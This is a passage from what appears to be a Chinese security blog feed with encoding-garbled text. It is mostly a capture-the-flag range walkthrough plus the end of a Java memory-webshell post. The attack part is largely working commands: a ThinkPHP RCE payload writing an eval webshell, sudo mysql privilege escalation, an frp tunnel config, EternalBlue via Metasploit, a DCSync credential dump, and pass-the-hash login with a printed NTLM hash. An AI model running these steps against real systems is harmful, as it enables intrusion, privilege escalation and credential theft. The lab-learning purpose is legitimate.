(StandardContext)standardContextField.get(appContext);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;LSE_shell&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(Shell.class.getName());</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">Shell</span>());</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">    context.addServletMappingDecoded(<span class="string">&quot;/LSE&quot;</span>,<span class="string">&quot;LSE_shell&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-235031832.png" class="">  <img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-235100584.png" class="">  <p>è®¿é—®shell.jspå°±å¯ä»¥å‘ç°æˆåŠŸå†™å…¥å†…å­˜é©¬</p><h1 id="é€šè¿‡ååºåˆ—åŒ–æ‰“å…¥å†…å­˜é©¬"><a href="#é€šè¿‡ååºåˆ—åŒ–æ‰“å…¥å†…å­˜é©¬" class="headerlink" title="é€šè¿‡ååºåˆ—åŒ–æ‰“å…¥å†…å­˜é©¬"></a>é€šè¿‡ååºåˆ—åŒ–æ‰“å…¥å†…å­˜é©¬</h1><p>ä¸Šé¢æˆ‘ä»¬æåˆ°äº†é€šè¿‡shell.japæ¥å†™å…¥å†…å­˜é©¬ï¼Œä½†é‚£ç»ˆç©¶è¿˜æ˜¯æœ‰æ–‡ä»¶è½åœ°ï¼Œæƒ³è¦å®ç°æ— æ–‡ä»¶è½åœ°è¿˜æ˜¯è¦ä½¿ç”¨ååºåˆ—åŒ–æ‰“å…¥<br>åé¢å†å­¦å§ï¼Œä¸€å¼€å§‹å¯¹ä½ å†…å­˜é©¬è¿˜æ˜¯å¾ˆæœ‰å…´è¶£çš„ï¼Œä½†æ˜¯ä¸€å­¦å°±æ²¡ä»€ä¹ˆå…´è¶£äº†ï¼Œå¤ªéš¾äº†ï¼Œå‰ç½®çŸ¥è¯†å¤ªå¤šï¼Œè€Œåˆ™ä¼šä¸ªæ— æ–‡ä»¶è½åœ°çš„å†…å­˜é©¬æ³¨å…¥æ‰¾ä¸åˆ°servletçš„å†…å­˜é©¬ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œInitial</title>
      <link href="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/"/>
      <url>/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»Šå¤©ä¸çŸ¥é“å­¦ç‚¹ä»€ä¹ˆå°±æ°ªé‡‘æ‰“äº†ä¸€ä¸‹æ˜¥ç§‹äº‘é•œçš„é¶åœºã€‚åªèƒ½è¯´æˆ‘å¯¹åŸŸçš„äº†è§£å‡ ä¹ä¸º0ã€‚è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹åŸŸæ¸—é€çš„ä¸€äº›çŸ¥è¯†ï¼Œå’Œtpâ€”â€”cveçš„æ¼æ´æˆå› å§"><a href="#ä»Šå¤©ä¸çŸ¥é“å­¦ç‚¹ä»€ä¹ˆå°±æ°ªé‡‘æ‰“äº†ä¸€ä¸‹æ˜¥ç§‹äº‘é•œçš„é¶åœºã€‚åªèƒ½è¯´æˆ‘å¯¹åŸŸçš„äº†è§£å‡ ä¹ä¸º0ã€‚è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹åŸŸæ¸—é€çš„ä¸€äº›çŸ¥è¯†ï¼Œå’Œtpâ€”â€”cveçš„æ¼æ´æˆå› å§" class="headerlink" title="ä»Šå¤©ä¸çŸ¥é“å­¦ç‚¹ä»€ä¹ˆå°±æ°ªé‡‘æ‰“äº†ä¸€ä¸‹æ˜¥ç§‹äº‘é•œçš„é¶åœºã€‚åªèƒ½è¯´æˆ‘å¯¹åŸŸçš„äº†è§£å‡ ä¹ä¸º0ã€‚è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹åŸŸæ¸—é€çš„ä¸€äº›çŸ¥è¯†ï¼Œå’Œtpâ€”â€”cveçš„æ¼æ´æˆå› å§"></a>ä»Šå¤©ä¸çŸ¥é“å­¦ç‚¹ä»€ä¹ˆå°±æ°ªé‡‘æ‰“äº†ä¸€ä¸‹æ˜¥ç§‹äº‘é•œçš„é¶åœºã€‚åªèƒ½è¯´æˆ‘å¯¹åŸŸçš„äº†è§£å‡ ä¹ä¸º0ã€‚è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹åŸŸæ¸—é€çš„ä¸€äº›çŸ¥è¯†ï¼Œå’Œtpâ€”â€”cveçš„æ¼æ´æˆå› å§</h1><h1 id="thinkphp5-23rceæ¼æ´"><a href="#thinkphp5-23rceæ¼æ´" class="headerlink" title="thinkphp5.23rceæ¼æ´"></a>thinkphp5.23rceæ¼æ´</h1><p>å†è·¯ç”±éšä¾¿ä¼ å‚æ•°?s=asdwdwaå°±ä¼šå‘ç”ŸæŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™å¯ä»¥å‘ç°è¯¥thinkç‰ˆæœ¬ä¸º5.23<br>å…¶æ¼æ´payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/Pg==&#x27; |base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ç›´æ¥å†™é©¬é€šè¿‡å“¥æ–¯æ‹‰æ¥è¿æ¥<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-191115228.png" class="">  </p><p>å…¶æƒé™ä¸ºwww-dataã€‚æˆ‘ä»¬å…ˆè¿›è¡Œå¸¸è§„ææƒã€‚<br>å…ˆå°è¯•suidææƒå¹¶æ²¡æœ‰å‘ç°å¯ä»¥åˆ©ç”¨çš„å‘½ä»¤<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-191602569.png" class=""><br>å†å°è¯•è¿›è¡Œsudoææƒ<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-193555517.png" class=""><br>å¯ä»¥å‘ç°æˆ‘ä»¬èƒ½å¤Ÿæ— å¯†ç ä½¿ç”¨mysql<br>æˆ‘è¿™é‡Œè´´ä¸€ä¸ªsudoææƒçš„æ–‡ç« <br><a href="https://blog.csdn.net/jian24_/article/details/137374396?spm=1001.2014.3001.5502">Linuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•ï¼ˆä¸Šï¼‰</a><br><a href="https://blog.csdn.net/jian24_/article/details/137400911?spm=1001.2014.3001.5502">Linuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•ï¼ˆä¸­ï¼‰</a><br><a href="https://blog.csdn.net/jian24_/article/details/137422615?spm=1001.2014.3001.5502">Linuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•ï¼ˆä¸‹ï¼‰</a></p><p><a href="https://www.huangmj.com/17116743651246.html">Linuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•</a><br>ä¸Šé¢çš„æ–‡ç« è®°å½•äº†70ç§sudoææƒçš„æ–¹æ³•<br>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨mysqlææƒ<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! HVV.out&#x27;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸Špayloadæ¥ä»¥rootæƒé™è¿è¡Œæˆ‘ä»¬çš„CSé©¬ä»è€Œä¸Šçº¿rootæƒé™çš„liunxä¸»æœºã€‚<br>ç„¶åè¿™é“é¢˜ç›®è¯´äº†flagæ•£è½å†ä¸åŒçš„ä¸»æœºä¸‹ã€‚äºæ˜¯æˆ‘ä»¬æ‰§è¡Œ<code>find / -name &quot;flag&quot;</code><br>æ¥æ‰¾flag<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-191709144.png" class="">  </p><p>ç„¶åæŒ‰ç…§å†…ç½‘æ¸—é€çš„æ ‡å‡†æµç¨‹<br>ifconfigå¯ä»¥çŸ¥é“è¯¥ä¸»æœºipä¸º172.22.1.15</p><p>ä¼ netspyå’Œfscanæ¥æ‰«å†…ç½‘çš„å¯è¾¾ç½‘æ®µå’Œèµ„äº§<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.1.15/24</span><br><span class="line">./fscan -h 172.22.1.15/16</span><br><span class="line">./netspy is</span><br></pre></td></tr></table></figure><br>fscançš„æ‰«æç»“æœå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿå’Œä¸€ä¸ªXIAORANG-WIN7.xiaorang.labåŸŸå†…ä¸»æœº172.22.1.21å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´<br>æˆ‘ä»¬å…ˆæ¥å¤§172.22.1.18çš„webç³»ç»Ÿ</p><h1 id="éš§é“"><a href="#éš§é“" class="headerlink" title="éš§é“"></a>éš§é“</h1><p>è¿™é‡Œæˆ‘ç”¨frpæ¥æ­éš§é“ã€‚é…ç½®å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = ip</span><br><span class="line">server_port = 7000 </span><br><span class="line"></span><br><span class="line">[plugin_socks] </span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6000 </span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin </span><br><span class="line">plugin_passwd = admin123 </span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br><span class="line">//frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = password</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>è¿è¡Œfrps -c frps.iniå’Œfrpc -c frpc.ini<br>å°±æˆåŠŸå®ç°éš§é“çš„æ­å»ºäº†<br>ç„¶åç”¨proxifieræ¥è¿›è¡Œå…¨å±€ä»£ç†ï¼Œç„¶åæ¥å¯¹å†…ç½‘çš„ç½‘ç«™è¿›è¡Œæ¸—é€ã€‚</p><h1 id="ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ"><a href="#ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ" class="headerlink" title="ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ"></a>ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</h1><p>è¾“å…¥admin/admin123è¿›å…¥ç½‘ç«™åå°ã€‚åœ¨ä»»åŠ¡èµ„æºç®¡ç†å¤„å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-211833522.png" class=""><br>ç„¶åå†è®¿é—®<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;id&gt;</span><br></pre></td></tr></table></figure><br>å³å¯æ¢å¤phpåç¼€å<br>webshellè·¯å¾„upload/2024-11/21_16581360.php</p><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-212112220.png" class="">  <p>å¯ä»¥å‘ç°å…¶æƒé™ä¸ºsystemã€‚æˆ‘ä»¬ç›´æ¥çœ‹æ–‡ä»¶å°±å¯ä»¥çœ‹flagäº†ã€‚<br>å› ä¸ºæˆ‘çš„å“¥æ–¯æ‹‰çœ‹ä¸­æ–‡å¥½åƒæœ‰ç¼–ç é”™è¯¯äºæ˜¯æˆ‘å°±æ¢äº†èšå‰‘<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-180725262.png" class=""><br>è™½ç„¶æ‹¿åˆ°äº†flagä½†æ˜¯æˆ‘è¿˜æ˜¯åœ¨æƒ³èƒ½ä¸èƒ½ä¸Šçº¿CSç»“æœå‘ç°è¿™ä¸ªé¶æœºæ˜¯ä¸å‡ºç½‘çš„ã€‚<br>æˆ‘åœ¨ç½‘ä¸Šçœ‹åˆ°äº†å‡ ç§æ–¹æ³•<br><a href="https://blog.csdn.net/weixin_44480014/article/details/125207525">https://blog.csdn.net/weixin_44480014/article/details/125207525</a><br>é€šè¿‡Pystingerçš„socks4æ¥åšæ­£å‘ä»£ç†<br>å› ä¸ºæ˜¥ç§‹äº‘é•œçš„é¶æœºå¤ªè´µäº†ï¼Œä¹‹åæœ‰æ—¶é—´æˆ‘ä¼šåœ¨è‡ªå·±çš„æœ¬åœ°æ­ç¯å¢ƒæ¥ç»§ç»­å®éªŒçš„</p><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-171526709.png" class="">  <h1 id="åŸŸå†…ä¸»æœºçš„æ°¸æ’ä¹‹è“"><a href="#åŸŸå†…ä¸»æœºçš„æ°¸æ’ä¹‹è“" class="headerlink" title="åŸŸå†…ä¸»æœºçš„æ°¸æ’ä¹‹è“"></a>åŸŸå†…ä¸»æœºçš„æ°¸æ’ä¹‹è“</h1><p>æˆ‘ä»¬é€šè¿‡msfæ¥æ‰“è¿™ä¸ªæ°¸æ’ä¹‹è“<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å…ˆé…ç½®kaliçš„proxychains4ä»£ç†è®¾ç½®<br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-214054199.png" class=""><br>é…ç½®å¥½å¯†ç åå°±å¯ä»¥ä½¿ç”¨msfconsoleæ¥æ‰“æ°¸æ’ä¹‹è“äº†<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-220311450.png" class=""><br>å¾—åˆ°è¯¥ä¸»æœºçš„Meterpreter ä¼šè¯</p><p>ç„¶åå°±æ˜¯æ‰“xiaorang.labçš„åŸŸæ§äº†<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯<br>DCSyncæ”»å‡»:<br>DCSyncçš„åŸç†æ˜¯åˆ©ç”¨åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶<br>DCSyncæ˜¯ADåŸŸæ¸—é€ä¸­å¸¸ç”¨çš„å‡­æ®çªƒå–æ‰‹æ®µï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸå†…ä¸åŒDCæ¯éš”15åˆ†é’Ÿä¼šè¿›è¡Œä¸€æ¬¡æ•°æ®åŒæ­¥ï¼Œå½“ä¸€ä¸ªDCä»å¦å¤–ä¸€ä¸ªDCåŒæ­¥æ•°æ®æ—¶ï¼Œå‘èµ·è¯·æ±‚çš„ä¸€æ–¹ä¼šé€šè¿‡ç›®å½•å¤åˆ¶åè®®ï¼ˆMS- DRSRï¼‰æ¥å¯¹å¦å¤–ä¸€å°åŸŸæ§ä¸­çš„åŸŸç”¨æˆ·å¯†ç è¿›è¡Œå¤åˆ¶ï¼ŒDCSyncå°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŸç†ï¼Œâ€œæ¨¡æ‹Ÿâ€DCå‘çœŸå®DCå‘é€æ•°æ®åŒæ­¥è¯·æ±‚ï¼Œè·å–ç”¨æˆ·å‡­æ®æ•°æ®ï¼Œç”±äºè¿™ç§æ”»å‡»åˆ©ç”¨äº†Windows RPCåè®®ï¼Œå¹¶ä¸éœ€è¦ç™»é™†åŸŸæ§æˆ–è€…åœ¨åŸŸæ§ä¸Šè½åœ°æ–‡ä»¶ï¼Œé¿å…è§¦å‘EDRå‘Šè­¦ï¼Œå› æ­¤DCSyncæ—¶ä¸€ç§éå¸¸éšè”½çš„å‡­æ®çªƒå–æ–¹å¼<br>DCSync æ”»å‡»å‰æ:<br>æƒ³è¿›è¡ŒDCSync æ”»å‡»ï¼Œå¿…é¡»è·å¾—ä»¥ä¸‹ä»»ä¸€ç”¨æˆ·çš„æƒé™ï¼š<br>Administrators ç»„å†…çš„ç”¨æˆ·<br>Domain Admins ç»„å†…çš„ç”¨æˆ·<br>Enterprise Admins ç»„å†…çš„ç”¨æˆ·åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·<br>å³ï¼šé»˜è®¤æƒ…å†µä¸‹åŸŸç®¡ç†å‘˜ç»„å…·æœ‰è¯¥æƒé™</p><p>æˆ‘ä»¬åœ¨è·å¾—çš„MS17-010è¿™å°æœºå™¨åŠ è½½mimikatz,å¹¶ä¸”æœ¬æœºæ˜¯systemæƒé™<br>å› ä¸ºæˆ‘ä»¬è·å¾—çš„æœºå­æƒé™å·²ç»ä¸ºsystemæƒé™äº†æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨kiwiæ¥å¯¹å…¶è¿›è¡ŒDCSyncæ”»å‡»<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-221219044.png" class=""><br>å¾—åˆ°åŸŸæ§ä¸»æœºç®¡ç†å‘˜çš„ç”¨æˆ·å‡­è¯<br>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨crackmapexecæ¥ç™»é™†åŸŸæ§adminè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;whoami&quot;</span><br></pre></td></tr></table></figure><br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-221628886.png" class=""><br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-221648540.png" class=""><br><img src="/2024/11/21/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/IMG_20241121-221721384.png" class=""><br>åé¢æˆ‘ä¹Ÿæƒ³å¯¹è¿™ä¸ªé¶æœºè¿›è¡Œcsä¸Šçº¿ï¼Œä½†æ˜¯ä»ç„¶ä¸å‡ºç½‘ã€‚<br>å› ä¸ºæ˜¥ç§‹äº‘é•œæœ‰ç‚¹å°è´µæˆ‘å°±æŠŠé¶æœºå…³äº†<br>ä¸ªäººçš„æ€è·¯æ˜¯ï¼Œé€šè¿‡æ­£å‘ä»£ç†æ¥æŠŠä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿçš„é¶æœºè¿›è¡Œcsä¸Šçº¿åœ¨é€šè¿‡ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿçš„æœºå­ä½œä¸ºè·³æ¿(ä½œä¸ºç›‘å¬å™¨)æ¥ä¸Šçº¿åŸŸå†…ä¸»æœºï¼Œç„¶åè¿›ä¸€æ­¥ä¸Šçº¿åŸŸæ§ä¸»æœº</p><p>è¿™äº›æˆ‘è¿˜éœ€è¦å†è¿›ä¸€æ­¥çš„å­¦ä¹ ï¼Œè¿˜æ˜¯å› ä¸ºå›Šä¸­ç¾æ¶©æ‰€ä»¥è¦å†æœ¬åœ°è‡ªä¸»å­¦ä¹ <br>flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç„æœºç¬¬ä¸€ç« åº”æ€¥å“åº”</title>
      <link href="/2024/11/21/%E7%8E%84%E6%9C%BAtop10/"/>
      <url>/2024/11/21/%E7%8E%84%E6%9C%BAtop10/</url>
      
        <content type="html"><![CDATA[<h1 id="å‚è€ƒ-å­¦ä¹ æ–‡ç« -æ–‡ç« "><a href="#å‚è€ƒ-å­¦ä¹ æ–‡ç« -æ–‡ç« " class="headerlink" title="å‚è€ƒ(å­¦ä¹ æ–‡ç« )æ–‡ç« "></a>å‚è€ƒ(å­¦ä¹ æ–‡ç« )æ–‡ç« </h1><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><h1 id="ç¬¬ä¸€ç« -åº”æ€¥å“åº”-webshellæŸ¥æ€"><a href="#ç¬¬ä¸€ç« -åº”æ€¥å“åº”-webshellæŸ¥æ€" class="headerlink" title="ç¬¬ä¸€ç«  åº”æ€¥å“åº”-webshellæŸ¥æ€"></a>ç¬¬ä¸€ç«  åº”æ€¥å“åº”-webshellæŸ¥æ€</h1><h2 id="1-é»‘å®¢webshellé‡Œé¢çš„flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#1-é»‘å®¢webshellé‡Œé¢çš„flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="1.é»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>1.é»‘å®¢webshellé‡Œé¢çš„flag 